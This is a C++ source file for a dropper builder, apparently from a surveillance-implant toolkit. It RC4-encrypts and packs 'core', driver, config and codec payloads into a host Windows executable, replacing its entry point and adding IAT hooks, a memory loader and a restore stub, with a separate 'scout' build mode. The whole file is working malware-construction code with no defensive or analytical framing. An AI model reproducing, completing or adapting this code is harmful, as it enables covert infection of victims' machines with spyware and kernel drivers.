#include <iostream>
#include <fstream>
#include <iomanip> 

#include <boost/filesystem.hpp>
namespace bf = boost::filesystem;

#include <aplib.h>

#include "PEObject.h"
#include "DropperObject.h"
#include "DropperCode.h"

using namespace std;

void rc4crypt(const unsigned char *key, size_t keylen,
			  unsigned char *data, size_t data_len);

DropperObject::DropperObject(PEObject& pe)
:  _data(0), _size(0), _pe(pe), _epOffset(0)
{
	_files.core.size = 0;
	_files.core64.size = 0;
	_files.config.size = 0;
	_files.codec.size = 0;
	_files.driver.size = 0;
	_files.driver64.size = 0;
	_files.bitmap.size = 0;
	
	int i = 0;
	/*
	while (_needed_strings[i] != NULL) {
		_strings.push_back(std::string(_needed_strings[i]));
		i++;
	}
	*/
	_exeType = _pe.exeType;
}

DWORD DropperObject::_build_scout( WINSTARTFUNC OriginalEntryPoint, std::string fPrefix )
{
	DWORD dataBufferSize = 0;

	unsigned int buffer_size = 65535
		+ _files.core.size;

	_data.reset( new char[buffer_size] );
	char * ptr = _data.get();

	DataSectionHeader* header = (DataSectionHeader*)ptr;
	memset(header, 0, sizeof(DataSectionHeader));
	ptr += sizeof(DataSectionHeader);
	
	header->exeType = _pe.exeType;

	// Generate ecryption key
	string rc4_key;
	generate_key(rc4_key, sizeof(header->rc4key));
	memcpy(header->rc4key, rc4_key.c_str(), sizeof(header->rc4key));
	//generate_key(rc4_key, 32);
	//memcpy(header->rc4key, rc4_key.c_str(), 32);

	cout << "Key       : " << rc4_key << endl;
	cout << "Key length: " << dec << sizeof(header->rc4key) << endl;	
	
	// Original EP
	header->pfn_OriginalEntryPoint = OriginalEntryPoint;

	// copy patched code for stage1 stub
	memcpy(ptr, _patches[0].buffer.get(), _patches[0].size);
	header->stage1.offset = ptr - _data.get();
	header->stage1.VA = _patches[0].VA;
	header->stage1.size = _patches[0].size;
	ptr += _patches[0].size;


	ptr = _embedFile(header->rc4key, _files.core, header->files.names.core, header->files.core, ptr);

	// compute total data section size and store in buffer
	dataBufferSize = ptr - _data.get();
	memcpy(ptr, &dataBufferSize, sizeof(dataBufferSize));
	ptr += sizeof(dataBufferSize);	
	END_MARKER(ptr);


	// find new EP and copy dropper code in it
	_epOffset = ptr - _data.get();
	ptr += _embedFunction((PVOID)DropperEntryPoint, (PVOID)DropperEntryPoint_End, header->functions.newEntryPoint, ptr);
	cout << "NewEntryPoint is " << header->functions.newEntryPoint.size << " bytes long, offset " << header->functions.newEntryPoint.offset << endl;


	// ExitProcessHook data
	*((DWORD*) ptr) = ptr - _data.get();
	ptr += sizeof(DWORD);
	END_MARKER(ptr);

	// ExitProcessHook code
	ptr += _embedFunction((PVOID)ExitProcessHook, (PVOID)ExitProcessHook_End, header->functions.exitProcessHook, ptr);
	cout << "ExitProcessHook is " << header->functions.exitProcessHook.size << " bytes long, offset " << header->functions.exitProcessHook.offset << endl;

	// RC4 code
	ptr += _embedFunction((PVOID)ArcFour, (PVOID)ArcFour_End, header->functions.rc4, ptr);
	cout << "RC4 is " << header->functions.rc4.size << " bytes long, offset " << (DWORD)header->functions.rc4.offset << endl;

	// _loadlirary
	ptr += _embedFunction((PVOID)MemoryLoader, (PVOID)MemoryLoader_End, header->functions.load, ptr);
	cout << "MemoryLoader is " << header->functions.load.size << " bytes long, offset " << (DWORD)header->functions.load.offset << endl;

	// GetCommandLineAHook code
	ptr += _embedFunction((PVOID)GetCommandLineAHook, (PVOID)GetCommandLineAHook_End, header->functions.GetCommandLineAHook, ptr);
	cout << "GetCommandLineAHook: " << std::hex << GetCommandLineAHook << " GetCommandLineAHook: " << std::hex << GetCommandLineAHook << endl;

	// GetCommandLineWHook code
	ptr += _embedFunction((PVOID)GetCommandLineWHook, (PVOID)GetCommandLineWHook_End, header->functions.GetCommandLineWHook, ptr);
	cout << "GetCommandLineWHook: " << std::hex << GetCommandLineWHook << " GetCommandLineWHook: " << std::hex << GetCommandLineWHook << endl;

	// HookIAT code
	ptr += _embedFunction((PVOID)HookIAT, (PVOID)HookIAT_End, header->functions.hookCall, ptr);
	cout << "HookIAT is " << header->functions.hookCall.size << " bytes long, offset " << (DWORD)header->functions.hookCall.offset << endl;

	header->restore.offset = ptr - _data.get();

	// static size of restoreStub
	header->restore.size = 54;  
	ptr += 54;

	header->isScout = TRUE;

	// compute total size
	_size = alignToDWORD(ptr - _data.get());
	
	cout << "Total dropper size is " << _size << " bytes." << endl;
	
	// return offset to new EP
	return _epOffset;

}

DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint, std::string fPrefix, std::string installDir )
{
	DWORD dataBufferSize = 0;
	
	unsigned int buffer_size = 65535 // account for header and accessory data (strings, calls, etc)
		+ _files.codec.size
		+ _files.core.size
		+ _files.core64.size
		+ _files.config.size
		+ _files.driver.size
		+ _files.driver64.size
		+ _files.bitmap.size
		;
	
	_data.reset( new char[buffer_size] );
	char * ptr = _data.get();
	
	DataSectionHeader* header = (DataSectionHeader*)ptr;
	memset(header, 0, sizeof(DataSectionHeader));
	ptr += sizeof(DataSectionHeader);
	
	header->exeType = _pe.exeType;

	// Generate ecryption key
	string rc4_key;
	generate_key(rc4_key, sizeof(header->rc4key));
	memcpy(header->rc4key, rc4_key.c_str(), sizeof(header->rc4key));
	
	cout << "Key       : " << rc4_key << endl;
	cout << "Key length: " << dec << sizeof(header->rc4key) << endl;	
	
	// Original EP
	header->pfn_OriginalEntryPoint = OriginalEntryPoint;
	
	// copy patched code for stage1 stub
	memcpy(ptr, _patches[0].buffer.get(), _patches[0].size);
	header->stage1.offset = ptr - _data.get();
	header->stage1.VA = _patches[0].VA;
	header->stage1.size = _patches[0].size;
	ptr += _patches[0].size;
	
	// embed core, driver, config and codec files
	ptr = _embedFile(header->rc4key, _files.core, header->files.names.core, header->files.core, ptr);
	ptr = _embedFile(header->rc4key, _files.core64, header->files.names.core64, header->files.core64, ptr);
	ptr = _embedFile(header->rc4key, _files.driver, header->files.names.driver, header->files.driver, ptr);
	ptr = _embedFile(header->rc4key, _files.driver64, header->files.names.driver64, header->files.driver64, ptr);
	ptr = _embedFile(header->rc4key, _files.config, header->files.names.config, header->files.config, ptr);
	ptr = _embedFile(header->rc4key, _files.codec, header->files.names.codec, header->files.codec, ptr);
	ptr = _embedFile(header->rc4key, _files.bitmap, header->files.names.bitmap, header->files.bitmap, ptr);
	
	// compute total data section size and store in buffer
	dataBufferSize = ptr - _data.get();
	memcpy(ptr, &dataBufferSize, sizeof(dataBufferSize));
	ptr += sizeof(dataBufferSize);	
	END_MARKER(ptr);
	
	// find new EP and copy dropper code in it
	_epOffset = ptr - _data.get();
	ptr += _embedFunction((PVOID)DropperEntryPoint, (PVOID)DropperEntryPoint_End, header->functions.newEntryPoint, ptr);
	cout << "NewEntryPoint is " << header->functions.newEntryPoint.size << " bytes long, offset " << header->functions.newEntryPoint.offset << endl;
	
	// CoreThreadProc code
	ptr += _embedFunction((PVOID)CoreThreadProc, (PVOID)CoreThreadProc_End, header->functions.coreThread, ptr);
	cout << "CoreThreadProc is " << header->functions.coreThread.size << " bytes long, offset " << header->functions.coreThread.offset << endl;
	
	// DumpFile code
	ptr += _embedFunction((PVOID)DumpFile, (PVOID)DumpFile_End, header->functions.dumpFile, ptr);
	cout << "DumpFile is " << header->functions.dumpFile.size << " bytes long, offset " << header->functions.dumpFile.offset << endl;
	
	// ExitProcessHook data
	*((DWORD*) ptr) = ptr - _data.get();
	ptr += sizeof(DWORD);
	END_MARKER(ptr);
	
	// ExitProcessHook code
	ptr += _embedFunction((PVOID)ExitProcessHook, (PVOID)ExitProcessHook_End, header->functions.exitProcessHook, ptr);
	cout << "ExitProcessHook is " << header->functions.exitProcessHook.size << " bytes long, offset " << header->functions.exitProcessHook.offset << endl;
		
	// GetCommandLineAHook data
	*((DWORD*) ptr) = ptr - _data.get();
	ptr += sizeof(DWORD);
	END_MARKER(ptr);	

	// GetCommandLineAHook code
	ptr += _embedFunction((PVOID)GetCommandLineAHook, (PVOID)GetCommandLineAHook_End, header->functions.GetCommandLineAHook, ptr);
	cout << "GetCommandLineAHook: " << std::hex << GetCommandLineAHook << " GetCommandLineAHook: " << std::hex << GetCommandLineAHook << endl;
	
	// GetCommandLineWHook data
	*((DWORD*) ptr) = ptr - _data.get();
	ptr += sizeof(DWORD);
	END_MARKER(ptr);	
	
	// GetCommandLineWHook code
	ptr += _embedFunction((PVOID)GetCommandLineWHook, (PVOID)GetCommandLineWHook_End, header->functions.GetCommandLineWHook, ptr);
	cout << "GetCommandLineWHook: " << std::hex << GetCommandLineWHook << " GetCommandLineWHook: " << std::hex << GetCommandLineWHook << endl;
	// RC4 code
	ptr += _embedFunction((PVOID)ArcFour, (PVOID)ArcFour_End, header->functions.rc4, ptr);
	cout << "RC4 is " << header->functions.rc4.size << " bytes long, offset " << (DWORD)header->functions.rc4.offset << endl;
	
	// hookCall code
	ptr += _embedFunction((PVOID)HookIAT, (PVOID)HookIAT_End, header->functions.hookCall, ptr);
	cout << "hookCall is " << header->functions.hookCall.size << " bytes long, offset " << (DWORD)header->functions.hookCall.offset << endl;
	
	cout << "Original ptr: " << hex << (DWORD)ptr << ", aligned: " << hex << (DWORD)alignToDWORD((DWORD)ptr) << endl;
	
	header->restore.offset = ptr - _data.get();
	// static size of restoreStub
	header->restore.size = 54;  
	ptr += 54;

	header->isScout = FALSE;

	memcpy(header->instDir, installDir.c_str(), sizeof(header->instDir));
	memcpy(header->fPrefix, fPrefix.c_str(), sizeof(header->fPrefix));

	// compute total size
	_size = alignToDWORD(ptr - _data.get());
	
	cout << "Total dropper size is " << _size << " bytes." << endl;
	
	// return offset to new EP
	return _epOffset;
}

bool DropperObject::_addCoreFile( std::string path, std::string name )
{
	cout << "Adding core file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.core.name = name;
	return _readFile(path, _files.core);	
}

bool DropperObject::_addCore64File( std::string path, std::string name )
{
	cout << "Adding core (64 bit) file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.core64.name = name;
	return _readFile(path, _files.core64);	
}

bool DropperObject::_addDriverFile( std::string path, std::string name )
{
	cout << "Adding driver file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.driver.name = name;
	return _readFile(path, _files.driver);
}

bool DropperObject::_addDriver64File( std::string path, std::string name )
{
	cout << "Adding driver file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.driver64.name = name;
	return _readFile(path, _files.driver64);
}

bool DropperObject::_addConfigFile( std::string path, std::string name )
{
	cout << "Adding config file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.config.name = name;
	return _readFile(path, _files.config);
}

bool DropperObject::_addCodecFile( std::string path, std::string name )
{
	cout << "Adding codec file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.codec.name = name;
	return _readFile(path, _files.codec);
}

bool DropperObject::_addBitmapFile( std::string path, std::string name )
{
	cout << "Adding demo bitmap file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.bitmap.name = "infected.bmp";
	return _readFile(path, _files.bitmap);
}

int DropperObject::_embedFunction( PVOID funcStart, PVOID funcEnd , DataSectionBlob& func, char *ptr )
{
	DWORD size = (DWORD)funcEnd - (DWORD)funcStart;

	memcpy(ptr, (PBYTE) funcStart, size);
	func.offset = ptr - _data.get();
	func.size = size;

	return size;
}

unsigned int ratio(unsigned int x, unsigned int y)
{
	if (x <= UINT_MAX / 100) x *= 100; else y /= 100;
	if (y == 0) y = 1;
	return x / y;
}

int __stdcall callback(unsigned int insize, unsigned int inpos, unsigned int outpos, void *cbparam)
{
	printf("\rcompressed %u -> %u bytes (%u%% done)", inpos, outpos, ratio(inpos, insize));
	return 1;
}

char* DropperObject::_embedFile(char* rc4key, NamedFileBuffer& source, DataSectionBlob& name, DataSectionCryptoPack& file, char* ptr )
{
	// check if we have some data to be appended
	if (source.buffer == NULL && source.size <= 0)
		return ptr;

	// copy name of file
	name.offset = ptr - _data.get();
	name.size = source.name.size() + 1;
	memcpy(ptr, source.name.c_str(), name.size);
	ptr += name.size;
	
#if defined PACK_DATA
	printf("[*] Compressing data, file size: %d\n", source.size);
	file.characteristics |= APLIB_PACKED;
	int length = source.size;
	
	char* packed = (char*) malloc(aP_max_packed_size(length));
	if (packed == NULL)
		return 0;
	
	char* workmem = (char*) malloc(aP_workmem_size(length));
	if (workmem == NULL)
		return 0;
	
	int packed_size = aP_pack(source.buffer.get(), packed, length, workmem, callback, NULL);
	printf("\n");
	if (packed_size == APLIB_ERROR) {
		printf("Error compressing!\n");
		return 0;
	}
	
	if (workmem) free(workmem);
#else
	char* packed = source.buffer.get();
	int packed_size = source.size;
#endif
	
	file.offset = ptr - _data.get();
	file.original_size = source.size;	
	file.size = packed_size;

	// crypt and write file
	file.characteristics |= RC4_CRYPTED;

	rc4crypt((unsigned char*)rc4key, RC4KEYLEN, (unsigned char*)packed, packed_size);
	memcpy(ptr, packed, packed_size);
	ptr += packed_size;

#if defined PACK_DATA
	free(packed);
#endif

	return ptr;
}

bool DropperObject::_readFile( std::string path, NamedFileBuffer& buffer )
{
	std::ifstream file(path.c_str(), ios::binary);
	
	if (!file.is_open())
		return false;
	
	// get length of file
	
	file.seekg(0, ios::end);
	buffer.size = file.tellg();
	file.seekg(0, ios::beg);
	
	buffer.buffer.reset( new char[buffer.size] );
	
	file.read(buffer.buffer.get(), buffer.size);
	file.close();
	
	return true;
}

bool DropperObject::build( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir, std::string fPrefix, bf::path demoBitmap, BOOL isScout )
{

	if (isScout)
	{
		try
		{
			_setExecutableName("XXX");
			_setInstallDir("123");

			_addCoreFile(core.string(), core.filename());

			_build_scout( (WINSTARTFUNC) _pe.epVA(), fPrefix );
		}
		catch (...)
		{
			cout << __FUNCTION__ << "Failed building dropper object for SCOUT." << endl;
			return false;
		}
	}
	else
	{
		try {
			_setExecutableName("XXX");
			_setInstallDir(installDir);

			_addCoreFile(core.string(), core.filename());
			_addConfigFile(config.string(), config.filename());

			if (!core64.empty())
				_addCore64File(core64.string(), core64.filename());

			if (!codec.empty())
				_addCodecFile(codec.string(), codec.filename());

			if (!driver.empty())
				_addDriverFile(driver.string(), driver.filename());

			if (!driver64.empty())
				_addDriver64File(driver64.string(), driver64.filename());

			if (!demoBitmap.empty())
				_addBitmapFile(demoBitmap.string(), demoBitmap.filename());

			_build( (WINSTARTFUNC) _pe.epVA(), fPrefix, installDir );

		} catch (...) {
			cout << __FUNCTION__ << "Failed building dropper object." << endl;
			return false;
		}
	}
	return true;
}

/*
int DropperObject::_getIATCallIndex( std::string dll, std::string call )
{
	int index = -1;
	
	try {
		IATEntry const & entry = _pe.getIATEntry(dll, call);
		index = entry.index();
	} catch (IATEntryNotFound) {
		cout << __FUNCTION__ << ": no entry for " << dll << "(" << call << ")" << endl;
	}
	
	return index;
}
*/

void DropperObject::setPatchCode( std::size_t idx, DWORD VA, char const * const data, std::size_t size )
{
	_ASSERT(data);
	_ASSERT(size);
	
	_patches[idx].VA = VA;
	_patches[idx].buffer.reset( new char[size] );
	memcpy( _patches[idx].buffer.get(), data, size );
	_patches[idx].size = size;
}

void generate_key(std::string& key, unsigned int length) 
{
	srand( (unsigned int) time(NULL) );
	
	std::ostringstream outStream;
	
	// initalize seed and fill array with random fuss
	for (unsigned int i = 0; i < length; i++) {
		outStream << std::setw(2) << std::setfill('0') << std::hex << (unsigned int) (rand() % 100);
	}

	key = outStream.str();
}

void rc4crypt(const unsigned char *key, size_t keylen,
			  unsigned char *data, size_t data_len)
{
	unsigned int i, j, k;
	unsigned char *pos;
	unsigned char S[256];
	size_t kpos;
	size_t skip = 0;

	/* Setup RC4 state */
	for (i = 0; i < 256; i++)
		S[i] = i;
	j = 0;
	kpos = 0;
	for (i = 0; i < 256; i++) {
		j = (j + S[i] + key[kpos]) & 0xff;
		kpos++;
		if (kpos >= keylen)
			kpos = 0;
		S_SWAP(i, j);
	}

	/* Skip the start of the stream */
	i = j = 0;
	for (k = 0; k < skip; k++) {
		i = (i + 1) & 0xff;
		j = (j + S[i]) & 0xff;
		S_SWAP(i, j);
	}

	/* Apply RC4 to data */
	pos = data;
	for (k = 0; k < data_len; k++) {
		i = (i + 1) & 0xff;
		j = (j + S[i]) & 0xff;
		S_SWAP(i, j);
		*pos++ ^= S[(S[i] + S[j]) & 0xff];
	}
}
